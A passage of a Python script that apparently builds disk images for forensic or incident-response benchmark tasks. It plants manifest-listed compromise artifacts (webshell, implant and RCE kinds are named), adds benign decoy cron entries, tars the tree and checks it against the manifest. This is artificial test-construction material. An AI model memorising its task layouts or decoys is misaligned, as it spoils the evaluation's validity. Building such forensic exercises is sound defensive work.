    return len(list(cti.rglob("*"))) + len(list(hand.rglob("*")))


# ---------------------------------------------------------------- main build
def build(task: Path, image_only: bool = False) -> bool:
    manifest = json.loads((task / "tests" / "manifest.json").read_text())
    ctx = make_ctx(manifest)
    disk = task / "assets" / "disk"
    if disk.exists():
        shutil.rmtree(disk)
    disk.mkdir(parents=True)

    taken = {a["path"].lstrip("/") for a in manifest["artifacts"]}
    taken |= {d["path"].lstrip("/") for d in manifest.get("decoys", [])}
    web_kinds = {"webshell", "php-webshell", "webshell-secondary", "defaced-page", "htaccess-redirect",
                 "exploit-implant", "rce-artifact", "vulnerable-lib", "wordpress-baseline", "jenkins-baseline", "groovy-init-hook"}
    web = any(a.get("kind") in web_kinds for a in manifest["artifacts"]) or \
        any(p.startswith(("var/www", "opt/", "srv/")) or p.endswith((".php", ".jsp", ".html")) for p in taken)
    write_skeleton(disk, ctx, taken, web)

    by_path = defaultdict(list)
    for a in manifest["artifacts"]:
        by_path[a["path"]].append(a)
    for path, arts in by_path.items():
        p = disk / path.lstrip("/")
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_bytes(build_file(path, arts, ctx))

    for d in manifest.get("decoys", []):
        p = disk / d["path"].lstrip("/")
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_bytes(("# scheduled maintenance (BENIGN — legitimate ops job)\n"
                       "0 3 * * * root /usr/local/bin/backup.sh --remote %s\n"
                       "# looks unusual but is an approved change (see /sas/handoff)\n" % ctx["subnet"]).encode())

    corruption_pass(disk, ctx)

    # Tarball goes under environment/ (the Docker build context); the extracted tree stays at
    # assets/disk/ for inspection + the local run_agent harness.
    (task / "environment").mkdir(parents=True, exist_ok=True)
    tgz = task / "environment" / "disk.tar.gz"
    with tarfile.open(tgz, "w:gz") as tar:
        for f in sorted(disk.rglob("*")):
            tar.add(f, arcname=str(f.relative_to(disk)))
    (task / "environment" / "disk.tar.gz.sha256").write_text(
        hashlib.sha256(tgz.read_bytes()).hexdigest() + "  disk.tar.gz\n")

    n_sas = write_sas_enrichment(task, manifest, ctx, image_only)

    missing = [a["path"] for a in manifest["artifacts"] if not (disk / a["path"].lstrip("/")).exists()]
    missing += ["DECOY:" + d["path"] for d in manifest.get("decoys", []) if not (disk / d["path"].lstrip("/")).exists()]
    n_files = sum(1 for _ in disk.rglob("*") if _.is_file())
    total_kb = sum(f.stat().st_size for f in disk.rglob("*") if f.is_file()) // 1024
    status = "100%%" if not missing else ("MISSING %d: %s" % (len(missing), missing))
    print("  %-22s %3d files  %5d KB disk  %3d KB tar  +%d /sas  manifest<->disk %s"
          % (task.name, n_files, total_kb, tgz.stat().st_size // 1024, n_sas, status))
    return not missing


def main(argv=None):
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("tasks", nargs="+", help="task directories (e.g. tasks/ssh-miner)")
    ap.add_argument("--cti-image-only", action="store_true", help="omit OCR/text layer from CTI page images (modality-swap probe)")
    args = ap.parse_args(argv)
    ok = True
    for t in args.tasks:
        t = Path(t)
        if (t / "tests" / "manifest.json").exists():
            ok = build(t, image_only=args.cti_image_only) and ok
        else:
            print("  %s: no tests/manifest.json — skipped" % t, file=sys.stderr)
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(main())
